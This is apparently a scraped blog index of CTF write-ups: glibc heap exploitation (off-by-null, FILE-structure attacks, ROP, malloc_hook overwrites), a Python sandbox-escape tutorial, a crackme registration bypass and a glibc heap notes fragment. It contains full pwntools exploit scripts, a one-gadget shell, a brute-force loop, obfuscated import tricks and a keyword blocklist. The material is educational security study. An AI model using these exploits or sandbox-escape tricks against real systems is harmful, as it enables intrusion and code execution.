sh.sendline(str(index)) #1 step for i in range(7): add(i,0x20) add(7,0x7830) #2 step add(7,0x4f0) #A add(8,0x10) #3 step delete(7) add(8,0x5f0) #4 and 5 step for i in range(3): add(7+i,0x20) add(9,0x20) edit(7,p64(0)+p64(0xf1)+'\\x30',full=True) #B #6 step for i in range(7): delete(i) add(0,0x10) delete(9) delete(8) add(0,0x500) #7 step for i in range(7): add(i,0x20) add(8,0x20) add(9,0x20) edit(8,p64(0)+'\\x10',full=True) #8 step for i in range(7): delete(i) delete(9) delete(7) #9 step for i in range(7): add(i,0x20) add(7,0x20) add(9,0x20) edit(7,'\\x10',full=True) add(1,0x18) add(0,0xf0) edit(1,p64(0)*2+p64(0xf0),full=True) #10 step for i in range(7): add(i+1,0xf0) for i in range(7): delete(i+1) #11 step delete(0) #get shell add(0,0x10) show(8) ru('\\n') libc_base=u64(ru('\\n').replace('\\n','').ljust(8,'\\x00'))-0x3b3ca0 malloc_hook=libc_base+libc.symbols['__malloc_hook'] realloc=libc_base+libc.symbols['realloc'] onegadget=libc_base+0xdf202 info_addr(\"libc_base\",libc_base) info_addr(\"malloc_hook\",malloc_hook) info_addr(\"onegadget\",onegadget) add(1,0x20) delete(8) edit(1,p64(malloc_hook-0x8)) add(0,0x20) add(1,0x20) edit(1,p64(onegadget)+p64(realloc+2)) add(1,0x20) itr() 注意这里heap地址的第13-16位是随机的，所以如果开启了ASLR那么就需要爆破，那么就需要写一个bash脚本。 for i in `seq 1 100` do python exp.py done REF linux程序保护机制\u0026gcc编译选项 glibc2.29下的off-by-null ","date":"2020-07-13","objectID":"/off-by-one%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/:3:0","tags":["pwn"],"title":"off by null利用总结","uri":"/off-by-one%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/"},{"categories":["knowledge"],"content":"Do one thing at a time, and do well. Introduction to the python sandbox ","date":"2020-06-15","objectID":"/introduction-to-the-python-sandbox-and-bytecode/:0:0","tags":["python"],"title":"Introduction to the python sandbox and bytecode","uri":"/introduction-to-the-python-sandbox-and-bytecode/"},{"categories":["knowledge"],"content":"What’s the python sandbox? The python sandbox is a restricted environment that you may not be able to use some packages, even you can’t use import instruction. You have to think about a way to achieve your goals(get shell or get flag) in the restricted environment. This article is about how to bypass the python sandbox. Let’s begin our travel. First, let’s look at the simplest environment that you can use anything. It means no instructions are forbidden. ","date":"2020-06-15","objectID":"/introduction-to-the-python-sandbox-and-bytecode/:1:0","tags":["python"],"title":"Introduction to the python sandbox and bytecode","uri":"/introduction-to-the-python-sandbox-and-bytecode/"},{"categories":["knowledge"],"content":"No instructions forbidden In this environment, we can use some packets to get shell. For example, the os packet provide us a system function, we can use it to get shell or anything you want. it also have a popen function, that have a same effect. Except that, the command and subprocess pecket is also useful for us. These packet will help us to get shell in some function. Let’s look the code to make thought more clear. import os os.system('ls') os.popen('ls') import commands commands.getoutput('ls') commands.getstatusoutput('ls') import subprocess subprocess.call(['ls'],shell=true) Obviously, the defender won’t make so simple environment, they must ban some functions, filter some code to prevent you to get shell. ","date":"2020-06-15","objectID":"/introduction-to-the-python-sandbox-and-bytecode/:2:0","tags":["python"],"title":"Introduction to the python sandbox and bytecode","uri":"/introduction-to-the-python-sandbox-and-bytecode/"},{"categories":["knowledge"],"content":"filter os, commands , subprocess, sys To filter these strings is easy, below code can do that. import re code = open('code.py').read() pattern = re.compile('import\\s+(os|commands|subprocess|sys)') match = re.search(pattern,code) if match: print 'forbidden module import detected' Above code, we can’t use os,commands,subprocess,sys,import any more.so what tech can we use to bypass this sandbox? __import__ and imoprtlib may is useful. We kown imoprt is a key word, so the packet name must be tag. But for function, it need parameter. And the __imoprt__ is the function version of import, so the packet name will be parameter not tag. Then we can encode the parameter to bypass string filter. The theory of importlib is same. f3ck = __import__(\"pbzznaqf\".decode('rot_13')) print f3ck.getoutput('ifconfig') import importlib f3ck = importlib.import_module(\"pbzznaqf\".decode('rot_13') print f3ck.getoutput('ifconfig') Except these, builtin function is also useful. The builtin function is live in python environment and need’t import. __builtin__ is the object having some builtin functions, we can use it to achieve some goals. For example, if we want to use open, init, chr, we juset need to use __builtin__.open(), __builtin__.init(), __builtin__.chr() __builtins__.open() __builtins__.init() __builtins__.chr() __builtin__ have some another dangerous functions(__import__,eval,exec,execfile)，so the defender may delete these. When it be deleted from __builtin__, we can’t use it. \u003e\u003e\u003e del __builtins__.chr \u003e\u003e\u003e del __builtins.chr Traceback (most recent call last): File \"\u003cstdin\u003e\", line 1, in \u003cmodule\u003e NameError: name '__builtins' is not defined Although delete this function feel is safe, we can use reload(__buiiltins__), then those are deleted function before can use again. The reload function is from imp packet. import imp imp.reload(__builtins__) ","date":"2020-06-15","objectID":"/introduction-to-the-python-sandbox-and-bytecode/:3:0","tags":["python"],"title":"Introduction to the python sandbox and bytecode","uri":"/introduction-to-the-python-sandbox-and-bytecode/"},{"categories":["knowledge"],"content":"use object/module’s attribution First, introduce a function dir. it will show attribution that the object/module can use. For example, if we want to know the list have how many functions, we can use dir([]) . \u003e\u003e\u003e dir([]) ['__add__', '__class__', '__contains__', '__delattr__', '__delitem__', '__delslice__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getitem__', '__getslice__', '__gt__', '__hash__', '__iadd__', '__imul__', '__init__', '__iter__', '__le__', '__len__', '__lt__', '__mul__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__reversed__', '__rmul__', '__setattr__', '__setitem__', '__setslice__', '__sizeof__', '__str__', '__subclasshook__', 'append', 'count', 'extend', 'index', 'insert', 'pop', 'remove', 'reverse', 'sort'] In these function, we may pay attention to __class__ attribution. this attribution is the class of object. for example, the list object’s class is list class, and the class have a __base__ attribution. it’s a tuple about this class’s parent class, also it means list it’s inherit classes. \u003e\u003e\u003e [].__class__.__bases__ (\u003ctype 'object'\u003e,) the object is a top class, many subclass inherit it.so it’s subclass attribution will list many useful class. \u003e\u003e\u003e [].__class__.__bases__[0].__subclasses__() [\u003ctype 'type'\u003e, \u003ctype 'weakref'\u003e, \u003ctype 'weakcallableproxy'\u003e, \u003ctype 'weakproxy'\u003e, \u003ctype 'int'\u003e, \u003ctype 'basestring'\u003e, \u003ctype 'bytearray'\u003e, \u003ctype 'list'\u003e, \u003ctype 'NoneType'\u003e, \u003ctype 'NotImplementedType'\u003e, \u003ctype 'traceback'\u003e, \u003ctype 'super'\u003e, \u003ctype 'xrange'\u003e, \u003ctype 'dict'\u003e, \u003ctype 'set'\u003e, \u003ctype 'slice'\u003e, \u003ctype 'staticmethod'\u003e, \u003ctype 'complex'\u003e, \u003ctype 'float'\u003e, \u003ctype 'buffer'\u003e, \u003ctype 'long'\u003e, \u003ctype 'frozenset'\u003e, \u003ctype 'property'\u003e, \u003ctype 'memoryview'\u003e, \u003ctype 'tuple'\u003e, \u003ctype 'enumerate'\u003e, \u003ctype 'reversed'\u003e, \u003ctype 'code'\u003e, \u003ctype 'frame'\u003e, \u003ctype 'builtin_function_or_method'\u003e, \u003ctype 'instancemethod'\u003e, \u003ctype 'function'\u003e, \u003ctype 'classobj'\u003e, \u003ctype 'dictproxy'\u003e, \u003ctype 'generator'\u003e, \u003ctype 'getset_descriptor'\u003e, \u003ctype 'wrapper_descriptor'\u003e, \u003ctype 'instance'\u003e, \u003ctype 'ellipsis'\u003e, \u003ctype 'member_descriptor'\u003e, \u003ctype 'file'\u003e, \u003ctype 'PyCapsule'\u003e, \u003ctype 'cell'\u003e, \u003ctype 'callable-iterator'\u003e, \u003ctype 'iterator'\u003e, \u003ctype 'sys.long_info'\u003e, \u003ctype 'sys.float_info'\u003e, \u003ctype 'EncodingMap'\u003e, \u003ctype 'fieldnameiterator'\u003e, \u003ctype 'formatteriterator'\u003e, \u003ctype 'sys.version_info'\u003e, \u003ctype 'sys.flags'\u003e, \u003ctype 'exceptions.BaseException'\u003e, \u003ctype 'module'\u003e, \u003ctype 'imp.NullImporter'\u003e, \u003ctype 'zipimport.zipimporter'\u003e, \u003ctype 'posix.stat_result'\u003e, \u003ctype 'posix.statvfs_result'\u003e, \u003cclass 'warnings.WarningMessage'\u003e, \u003cclass 'warnings.catch_warnings'\u003e, \u003cclass '_weakrefset._IterationGuard'\u003e, \u003cclass '_weakrefset.WeakSet'\u003e, \u003cclass '_abcoll.Hashable'\u003e, \u003ctype 'classmethod'\u003e, \u003cclass '_abcoll.Iterable'\u003e, \u003cclass '_abcoll.Sized'\u003e, \u003cclass '_abcoll.Container'\u003e, \u003cclass '_abcoll.Callable'\u003e, \u003ctype 'dict_keys'\u003e, \u003ctype 'dict_items'\u003e, \u003ctype 'dict_values'\u003e, \u003cclass 'site._Printer'\u003e, \u003cclass 'site._Helper'\u003e, \u003ctype '_sre.SRE_Pattern'\u003e, \u003ctype '_sre.SRE_Match'\u003e, \u003ctype '_sre.SRE_Scanner'\u003e, \u003cclass 'site.Quitter'\u003e, \u003cclass 'codecs.IncrementalEncoder'\u003e, \u003cclass 'codecs.IncrementalDecoder'\u003e Thus, we can find some useful function from this. for example, we can use file class to get flag:) \u003e\u003e\u003e [].__class__.__bases__[0].__subclasses__()[40]('./flag.txt').read() 'flag{you_are_itelli}\\n' Introduction to the python bytecode ","date":"2020-06-15","objectID":"/introduction-to-the-python-sandbox-and-bytecode/:4:0","tags":["python"],"title":"Introduction to the python sandbox and bytecode","uri":"/introduction-to-the-python-sandbox-and-bytecode/"},{"categories":["knowledge"],"content":"Function Object First，we’ll start out with a really high-level view of python’s internals. What happens when you execute a line of code in your python REPL? There are four steps that python takes when you hit return: lexing, parsing, compiling, and interpreting. Lexing is breaking the line of code you just typed into tokens. The parser takes those tokens and generate a structure that shows their relationship to each other(in this case , an Abstract Syntax Tree). The compiling then takes the AST and turns it into one code objects(stack oriented programming language).Finally, the interpreter takes each code object executes the code it represents. You might head of ‘function objects’. it also be called ‘functions are first-class objects’, or ‘python has first-class functions.’. Let’s take a look at one. \u003e\u003e\u003e def func(a): ... b=b+2 ... return a+b ... \u003e\u003e\u003e func \u003cfunction func at 0x7f6175335950\u003e We can look that func is a func object.so it function is a object, it also have some attribution, we can use dir function to list attributions of the function object. \u003e\u003e\u003e dir(func) ['__call__', '__class__', '__closure__', '__code__', '__defaults__', '__delattr__', '__dict__', '__doc__', '__format__', '__get__', '__getattribute__', '__globals__', '__hash__', '__init__', '__module__', '__name__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'func_closure', 'func_code', 'func_defaults', 'func_dict', 'func_doc', 'func_globals', 'func_name'] We need’t care about all attribution,just pay attention to __code__, let’s look what is it. \u003e\u003e\u003e func.__code__ \u003ccode object func at 0x7f6175335230, file \"\u003cstdin\u003e\", line 1\u003e func.__code__ is a code object, what is code object? let’s look at next subject. ","date":"2020-06-15","objectID":"/introduction-to-the-python-sandbox-and-bytecode/:5:0","tags":["python"],"title":"Introduction to the python sandbox and bytecode","uri":"/introduction-to-the-python-sandbox-and-bytecode/"},{"categories":["knowledge"],"content":"Code Object A code object is generated by the python compiler and interpreted by the interpreter. It contains information that interpreter needs to do its job. Let’s look at the attributes of the code object. \u003e\u003e\u003e dir(func.__code__) ['__class__', '__cmp__', '__delattr__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__le__', '__lt__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'co_argcount', 'co_cellvars', 'co_code', 'co_consts', 'co_filename', 'co_firstlineno', 'co_flags', 'co_freevars', 'co_lnotab', 'co_name', 'co_names', 'co_nlocals', 'co_stacksize', 'co_varnames'] There’s a bunch of stuff going on here, much of which we’re not going to worry about today Let’s take a look at three attributes that are interesting to us for our code object. \u003e\u003e\u003e func.__code__.co_varnames ('a', 'b') \u003e\u003e\u003e func.__code__.co_consts (None, 2) \u003e\u003e\u003e func.__code__.co_argcount 1 the co_varnames is the name of local variable used in functions. the co_consts is some consts we can see in code. the argcount is count of arguments. But so fat, we haven’t seen anything that looks like instructions to execute the code. these instructions are called bytecode. we can use co_code to look at it. \u003e\u003e\u003e func.__code__.co_code '|\\x01\\x00d\\x01\\x00\\x17}\\x01\\x00|\\x00\\x00|\\x01\\x00\\x17S' ","date":"2020-06-15","objectID":"/introduction-to-the-python-sandbox-and-bytecode/:6:0","tags":["python"],"title":"Introduction to the python sandbox and bytecode","uri":"/introduction-to-the-python-sandbox-and-bytecode/"},{"categories":["knowledge"],"content":"Byte Code we can seen that byte code is a series of bytes. they look wacky when we print them because some bytes are printable and other aren’t. we can transfer it to number. \u003e\u003e\u003e [ord(i) for i in func.__code__.co_code ] [124, 1, 0, 100, 1, 0, 23, 125, 1, 0, 124, 0, 0, 124, 1, 0, 23, 83 Ok, we can see that these bytes that make up python bytecode. but what’s it mean? we can use dissemble function to know it. \u003e\u003e\u003e import dis \u003e\u003e\u003e dis.dis(func.__code__.co_code) 0 LOAD_FAST 1 (1) 3 LOAD_CONST 1 (1) 6 BINARY_ADD 7 STORE_FAST 1 (1) 10 LOAD_FAST 0 (0) 13 LOAD_FAST 1 (1) 16 BINARY_ADD 17 RETURN_VALUE dis.dis take these bytecode to human-readable. now, we can know what these byte means. The first columns is the offset into the bytecode. The second columns just for our human, make us can read it. the interpreter doesn’t need it. The last two columns give some details information about the argument of instructions. The three columns represents an index into other attributes of the code object. for example, LOAD_FAST’s argument is an index into the list co_varnames. But how the dis module get from bytes like 100 to names like LOAD_CONST and back? The file opcode.py defines the instructions and it’s value, so dis can look through the file to translate bytecode to human-readable. ok, there may be last question? How to execute the python interpreter? first, i want to introduce a named stack oriented programming language. it pay all attention to stack. for example, if you want to compute a add b, these program will push a into stack, then push b to stack, eventually execute add instruction. after that, it will pop a and b, and push result into stack. the work of python interpreter is same as that. for LOAD_FAST 1 , it will push a into stack LOAD_CONST 1 will push 2 const into stack. and then BINARY_ADD will pop a and 2, push result into stack. 2020RACTF-puffer overflow let’s look at one ctf problem. this subject is include python sandbox and bytecode. first we’ll look what’s the problem. def put_on_stack(string): \"\"\" Generate the bytecode required to put a single string onto the stack. \"\"\" op = b\"\" for n, i in enumerate(string): # LOAD_GLOBAL 0 (chr) op += b\"t\\x00\" # LOAD_CONST n op += b\"d\" + bytes([ord(i)]) # CALL_FUNCTION 1 op += b\"\\x83\\x01\" if n != 0: # BINARY_ADD op += b\"\\x17\\x00\" return op def execute_bytecode(code): \"\"\" Executes the provided bytecode. Handy for getting the top item off the stack. \"\"\" from types import CodeType import builtins # This should be large enough for most things stacksize = 1024 # Load in enough for put_on_stack to work. # NOTE: This function is unable to call \"import\" or similar # dangerous things due to co_names acting as a whitelist. # (Python loads names from a constants array, so it can\"t # load something that\"s not there!) consts = (*range(256), ) names = (\"chr\", \"ord\", \"globals\", \"locals\", \"getattr\", \"setattr\") # Tag on a trailing RETURN call just incase. code += b\"S\\x00\" # Construt the code object inject = CodeType( 0, # For python 3.8 0, 0, 0, stacksize, 2, code, consts, names, (), \"\", \"\", 0, b\"\", (), () ) # Create a copy of globals() and load in builtins. builtins aren\"t # normally included in global scope. globs = dict(globals()) globs.update({i: getattr(builtins, i) for i in dir(builtins)}) # Go go go! return eval(inject, globs) def smart_input(): \"\"\" This function aims to make python 3's input smart:tm: It checks if you're piping or redirecting, and switches to reading from stdin directly. \"\"\" import os, sys, stat mode = os.fstat(0).st_mode if stat.S_ISREG(mode) or stat.S_ISFIFO(mode): return sys.stdin.buffer.read() return input().encode() print(\"Hello!\") print(\"What's your name?\") name = smart_input() name = put_on_stack(name[:32].decode()) + name[32:] print(f\"Hello {execute_bytecode(name)}!\") print(\"It's nice to meet you!\") this scripts don’t restrict us to enter how many words, and it will show the first 32 words. but after that, we enter will execute. def execute_bytecode(code): \"\"\" Executes the ","date":"2020-06-15","objectID":"/introduction-to-the-python-sandbox-and-bytecode/:7:0","tags":["python"],"title":"Introduction to the python sandbox and bytecode","uri":"/introduction-to-the-python-sandbox-and-bytecode/"},{"categories":["reverse"],"content":"我只想做你的太阳 你的太阳 在你的心里呀 在你的心底呀 ——太阳 前言 这是吾爱破解160crakeme系列里面的第5题，这道题的作者设置了层层关卡，其验证机制简直反人类，只能说这个机制是用来专门考验reverse人员的，那让我们一起来看一看一道题吧。 破解 ","date":"2020-06-05","objectID":"/crakeme160-005-ajj-2/:0:0","tags":["crakeme","wp"],"title":"CrakeMe160(005)-ajj.2","uri":"/crakeme160-005-ajj-2/"},{"categories":["reverse"],"content":"去壳 程序加了UPX壳，可以手动去壳，也可以用脱壳机。在尝试手动脱壳过程中,dump程序后，程序运行出错，于是就用脱壳机脱壳了。 UPX脱壳机可以在爱盘里面找到，脱壳完毕我们就开始破解了。 ","date":"2020-06-05","objectID":"/crakeme160-005-ajj-2/:1:0","tags":["crakeme","wp"],"title":"CrakeMe160(005)-ajj.2","uri":"/crakeme160-005-ajj-2/"},{"categories":["reverse"],"content":"DeDe分析控件 程序是由Delphi编写的，所以可以用DeDe反编译，得到程序的控件和事件信息。 ","date":"2020-06-05","objectID":"/crakeme160-005-ajj-2/:2:0","tags":["crakeme","wp"],"title":"CrakeMe160(005)-ajj.2","uri":"/crakeme160-005-ajj-2/"},{"categories":["reverse"],"content":"搜索关键字 搜索关键词，查找关键代码。这里我在IDA中搜索'“注册\"得到下面的结果。 “注册了”字符应该是注册成功之后显示的，我们去查找哪儿引用了这个字符。成功的找到了验证注册成功的代码。 要求ebx+304不等于C34，ebx+308不等于230D，ebx+310等于F94，ebx+31C不等于3E7,ebx+318和ebx+314相等，我们按照难易程度和顺序依次来分析，分析的顺序如下： ebx+31C不等于3E7 ebx+304不等于C34 ebx+308不等于230D ebx+310等于F94 ebx+318和ebx+314相等 利用的分析手段是，常量跟踪。下面的分析以其在ebx中的偏移为标题。 ","date":"2020-06-05","objectID":"/crakeme160-005-ajj-2/:3:0","tags":["crakeme","wp"],"title":"CrakeMe160(005)-ajj.2","uri":"/crakeme160-005-ajj-2/"},{"categories":["reverse"],"content":"31C 在IDA中搜索31C常量并添加筛选条件。 跟踪第二条指令 当Button1被点击时，就会触发这个事件，并将31C赋值为3E7，因此只要我们不点击注册按钮，就可以通过31C的验证。 ","date":"2020-06-05","objectID":"/crakeme160-005-ajj-2/:4:0","tags":["crakeme","wp"],"title":"CrakeMe160(005)-ajj.2","uri":"/crakeme160-005-ajj-2/"},{"categories":["reverse"],"content":"304 同理用IDA搜索并筛选304常量 这里涉及的事件函数是_TForm1_FormCreate，让我们一起来分析这个时间函数的内容。 这里会去读取“X:\\ajj.126.c0m\\j\\o\\j\\o\\ok.txt”这个路径下的ok.txt文件，方便起见我们可以把X修改为D，按照路径创建ok.txt. 这里会比较ok.txt文件里面的内容是否等于这个字符串，用WinHex去编辑ok.txt使其内容等于这里的验证字符串。 通过上面的验证后，304不会被赋值为C34 ","date":"2020-06-05","objectID":"/crakeme160-005-ajj-2/:5:0","tags":["crakeme","wp"],"title":"CrakeMe160(005)-ajj.2","uri":"/crakeme160-005-ajj-2/"},{"categories":["reverse"],"content":"308 分析方法同上，IDA搜索加筛选。 与之相关的事件函数由，Panel1DbClick和Button1MouseDown 对左右键进行了判断，如果是左键点击，将对308赋值340D，如果是右键点击，将会加3。308的初始值为28E。 我们再看一下Panel1Dbclick里面的内容。 当308的值为29D时，会对2F0处的空间进行操作，而2F0就是Edit2，这里作用是激活Edit2的编辑功能。而要使308为29D我们需要右键点击按钮（29D-28E）/3=5次。然后双击Pannel，注意不要点到图片。 ","date":"2020-06-05","objectID":"/crakeme160-005-ajj-2/:6:0","tags":["crakeme","wp"],"title":"CrakeMe160(005)-ajj.2","uri":"/crakeme160-005-ajj-2/"},{"categories":["reverse"],"content":"310 310是该程序最复杂的地方。查找关键代码的方法同上。 这里主要涉及FormMouseMove事件函数，我们看一下该函数的关键内容。 当检测到鼠标发生移动后，就会执行这个事件函。该函数首先判断当前显示的图片是否是2E0及Image3，如果是，则检测其x是否大于0E2，y是否大于13C，是则给310赋值10。 后面又检测2DC及Image2，其x是否小于17，y是否大于12C，是则判断310是否等于10，是则继续判断30C的值是否等于9，如果不等于则会将310处赋值为F94，也就是我们的目标值。 所以如果要将310处赋值为F94我们还需要使得30C处的值不等于9，我们来看一下如何修改30C处的值。 Form组件创建时，给30C赋初值为9，而再Edit2DblClick中会修改30C中的值。 Edit2DblClick中会检测Edit2中的值，是否长度为8，且第2个字符为’_‘，第6个字符为’，‘，并且Edit1中的字符长度为3的倍数，则会对30C赋值，从而使得其不等于9，通过上面的验证。 ","date":"2020-06-05","objectID":"/crakeme160-005-ajj-2/:7:0","tags":["crakeme","wp"],"title":"CrakeMe160(005)-ajj.2","uri":"/crakeme160-005-ajj-2/"},{"categories":["reverse"],"content":"318和314 方法同理，逆向分析结果是左右键点击不同的图片时，318会增加不同的结果，最后通过组合使得318的结果等于314及可以通过验证，最终破解成功。 参考 CrackMe005全破详解 ","date":"2020-06-05","objectID":"/crakeme160-005-ajj-2/:8:0","tags":["crakeme","wp"],"title":"CrakeMe160(005)-ajj.2","uri":"/crakeme160-005-ajj-2/"},{"categories":["ctf"],"content":"分享一个比赛的两道题目 domo ","date":"2020-05-28","objectID":"/gkctf-writeup/:0:0","tags":["pwn","wp"],"title":"GKCTF Writeup","uri":"/gkctf-writeup/"},{"categories":["ctf"],"content":"漏洞分析 程序漏洞十分明明显，有一个off by one和任意地址写，难点在于程序使用了seccomp开启了沙箱，同时会对malloc_hook和realloc_hook检测是否写入，如果写入了，就不能再进行菜单操作，也就不能用malloc去触发onegadget。 但是出题人使用seccomp不是在程序开头，而是在程序结束时，这就造成了几个非预期解。比如seccomp会调用calloc，所以可以写calloc_hook来触发onegadget或则利用scanf输入大量字节触发malloc，进而可以通过写__malloc_hook来获得shell。 如果出题人是将seccomp用在开头，那么就不会有这些非预期解了，就只能用预期解来做。由于seccomp限制了execve，所以我们只能用orw来做，但是如何用程序的漏洞来达到写程序的stack，构造ROP呢？这就是这道题有意思的地方。 思路是这样的： 攻击stdout，来输出environ的内容，environ的值是一个栈的地址，这个栈地址是栈底信息的指针，调试一下可以看到，栈底保存了程序环境变量，程序名等等信息。==\u003e泄漏栈地址 攻击stdin，修改其缓冲区为main函数储存返回地址的栈地址。 构造ROP链，修改栈中的数据，来获得flag 这里最有趣的一点就是攻击stdin，在之前通常都是攻击stdout来泄漏libc地址。 攻击stdin的方式就是将其的IO_Buf修改为栈地址，这样输入的数据就会先存放在栈地址中，进而可以构造ROP。 ","date":"2020-05-28","objectID":"/gkctf-writeup/:1:0","tags":["pwn","wp"],"title":"GKCTF Writeup","uri":"/gkctf-writeup/"},{"categories":["ctf"],"content":"EXP from pwn import * from LibcSearcher import * if args['REMOTE']: sh=remote('node3.buuoj.cn',29731) else: sh=process('./domo') if args['I386']: context.arch='i386' else: context.arch='amd64' if args['DEBUG']: context.log_level='debug' libc=ELF('./libc.so.6') def choice(elect): sh.recvuntil('\u003e') sh.sendline(str(elect)) def add(size,content): choice(1) sh.recvuntil(':') sh.sendline(str(size)) sh.recvuntil(':') sh.sendline(content) def edit(addr,num): choice(4) sh.recvuntil(':') sh.sendline(str(addr)) sh.recvuntil(':') sh.send(num) def show(index): choice(3) sh.recvuntil(':') sh.sendline(str(index)) def delete(index): choice(2) sh.recvuntil(':') sh.sendline(str(index)) gdb.attach(sh,''' b*0x7ffff77e7102 c ''') add(0x80,'a') #0 add(0x60,'a') #1 add(0x60,'a') #2 delete(0) #-0 delete(1) #-1 delete(2) #-2 #leak libc add(0x80,'') #0 show(0) sh.recvuntil('\\n') sh.recvuntil('\\n') libc_base=u64(('\\n'+sh.recvuntil('\\n').replace('\\n','')).ljust(8,'\\x00'))-0x3c4b0a environ_addr=libc_base+libc.symbols['environ'] stdout_hook=libc_base+libc.symbols['_IO_2_1_stdout_'] stdin_hook=libc_base+libc.symbols['_IO_2_1_stdin_'] _IO_file_jumps=libc_base+libc.symbols['_IO_file_jumps'] print hex(stdin_hook) #leak heap add(0x60,'') #1 show(1) sh.recvuntil('\\n') sh.recvuntil('\\n') heap=u64(('\\n'+sh.recvuntil('\\n').replace('\\n','')).ljust(8,'\\x00'))-0x0a add(0x60,'') #2 print hex(heap) #leak stack add(0x60,'') #3 add(0xf0,'a') #4 add(0x60,'a') #5 delete(3) #-3 add(0x68,p64(0)*12+p64(0xd0)) #3 delete(1) #-1 add(0x60,p64(0)+p64(0xd1)+p64(heap+0x140)*2+p64(0)*2+p64(heap+0x120)*2) #1 delete(4) #-4 delete(3) #-3 add(0x110,p64(0)*11+p64(0x71)+p64(stdout_hook-0x43)) add(0x60,'') payload='\\x00'*3+p64(0)*5+p64(_IO_file_jumps)+p64(0xfbad1811)+p64(0)*3+p64(environ_addr)+p64(environ_addr+8) print hex(len(payload)) add(0x68,payload) sh.recvuntil('\\n') stack=u64(sh.recv(8))-0xf2 #modify stdin delete(4) delete(3) edit(stdin_hook-0x20,'\\x71') add(0x110,p64(0)*11+p64(0x71)+p64(stdin_hook-0x28)) add(0x60,'') payload=p64(0)+p64(_IO_file_jumps)+p64(0)+p64(0xfbad1800)+p64(0)*6+p64(stack)+p64(stack+0x100) print hex(len(payload)) add(0x60,payload) add(0xa0,'./flag\\x00'.ljust(8,'\\x00')) #rop pop_rdi_ret=libc_base+libc.search(asm(\"pop rdi\\nret\")).next() pop_rsi_ret=libc_base+libc.search(asm('pop rsi\\nret')).next() pop_rdx_ret=libc_base+libc.search(asm('pop rdx\\nret')).next() open_=libc_base+libc.symbols['open'] read=libc_base+libc.symbols['read'] puts=libc_base+libc.symbols['puts'] flag=heap+0x250 payload=p64(pop_rdi_ret)+p64(flag)+p64(pop_rsi_ret)+p64(2)+p64(open_) payload+=p64(pop_rdi_ret)+p64(3)+p64(pop_rsi_ret)+p64(flag+0x10)+p64(pop_rdx_ret)+p64(0x20)+p64(read) payload+=p64(pop_rdi_ret)+p64(flag+0x10)+p64(puts)+p64(0x6161616161) print hex(pop_rdi_ret) sh.sendlineafter('\u003e','5\\n'+payload) sh.interactive() girfriend simulation ","date":"2020-05-28","objectID":"/gkctf-writeup/:2:0","tags":["pwn","wp"],"title":"GKCTF Writeup","uri":"/gkctf-writeup/"},{"categories":["ctf"],"content":"漏洞分析 这道题有趣的地方是可以开启多个线程，每个线程存在UAF漏洞，但是线程的堆块并不arena是释放后就返回堆块的，不想main arena有这些管理机制，因此如果线程的堆块不是在main arena里面的话，我们是无法利用的，需要想办法把它的堆弄到main arena里面去。 刚好libc的版本是2.23，线程arena是有限的，当线程arena分配完了后，线程就会使用main arena，这个时候我们就达到了目的。 接下来的任务就是如何去判断线程的堆是否在main arena里面。我们可以先创建一个promise，然后在删除掉，再创建一个promise，这个时候的promise有上一次创建的promise的数据，可以达到泄漏的目的，因此可以依据泄漏的数据来判断是否再main arena中。 获得再main arena中的线程后，利用就很简单了，不赘诉了。 ","date":"2020-05-28","objectID":"/gkctf-writeup/:3:0","tags":["pwn","wp"],"title":"GKCTF Writeup","uri":"/gkctf-writeup/"},{"categories":["ctf"],"content":"EXP from pwn import * from LibcSearcher import * if args['REMOTE']: sh=remote() else: sh=process('./pwn') if args['I386']: context.arch='i386' else: context.arch='amd64' if args['DEBUG']: context.log_level='debug' def choice(elect): sh.recvuntil('\u003e\u003e') sh.sendline(str(elect)) def add(size,content): choice(1) sh.recvuntil('size?') sh.sendline(str(size)) sh.recvuntil(':') sh.sendline(content) def show(): choice(3) def delete(): choice(2) sh.sendline(str(9)) for i in range(8): add(0x10,'a') delete() add(0x10,'11111111') show() sh.recvuntil('11111111') heap_addr=u64(sh.recv(6).ljust(8,'\\x00')) print hex(heap_addr) choice(5) add(0x60,'a') delete() choice(5) sh.recvuntil('wife:') stdout_addr=int(sh.recvuntil('\\x1b').replace('\\x1b',''),16) libc=LibcSearcher('_IO_2_1_stdout_',stdout_addr) libc_base=stdout_addr-libc.dump('_IO_2_1_stdout_') realloc=libc_base+libc.dump('realloc') malloc_hook=libc_base+libc.dump('__malloc_hook') onegadget=libc_base+0x4526a print hex(onegadget) sh.recvuntil('impress') sh.send(p64(malloc_hook-0x23)) sh.sendline('a') sh.recvuntil('Questionnaire') sh.sendline('\\x00'*0xb+p64(onegadget)+p64(realloc+4)) gdb.attach(sh) sh.interactive() ","date":"2020-05-28","objectID":"/gkctf-writeup/:4:0","tags":["pwn","wp"],"title":"GKCTF Writeup","uri":"/gkctf-writeup/"},{"categories":["knowledge"],"content":"最近阅读了《glibc内存管理ptmalloc源码分析》一书，对ptmalloc内部机制了解更深入了一层。但是书中所分析的libc版本是2.23，如今libc以及更新到2.31，且pwn中libc的版本也普遍是2.27及以上，所以就想写一篇博客纪录一下各个版本libc堆管理的差别和新增的保护机制。 Glibc2.23 ","date":"2020-05-19","objectID":"/%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%ACglibc%E7%9A%84%E5%A0%86%E7%AE%A1%E7%90%86%E5%92%8C%E6%96%B0%E5%A2%9E%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/:0:0","tags":null,"title":"不同版本glibc的堆管理和新增保护机制","uri":"/%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%ACglibc%E7%9A%84%E5%A0%86%E7%AE%A1%E7%90%86%E5%92%8C%E6%96%B0%E5%A2%9E%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"},{"categories":["knowledge"],"content":"malloc和free的逻辑 这个版本的libc应该是大家最为熟悉的，在入门pwn堆题的时候，做到的题大多都是这个版本。这个版本的堆管理有挺多的漏洞，利用方法也是最多的。 首先让我们先看一下这个版本下_int_malloc的逻辑，由于这个函数的源代码太多了，在这里我仅仅只是从中提取主要部分。 void * 